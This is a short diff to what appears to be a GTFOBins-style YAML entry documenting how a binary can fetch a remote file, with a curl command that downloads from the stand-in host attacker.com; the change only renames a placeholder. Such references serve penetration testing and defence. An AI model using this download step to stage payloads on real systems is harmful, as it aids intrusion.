@@ -10,6 +10,6 @@ functions:
     - description: Fetch a remote file via HTTP GET request.
       code: |
         URL=http://attacker.com/file_to_get
-        LFILE=where_to_save
+        LFILE=file_to_save
         curl $URL -o $LFILE
 ---
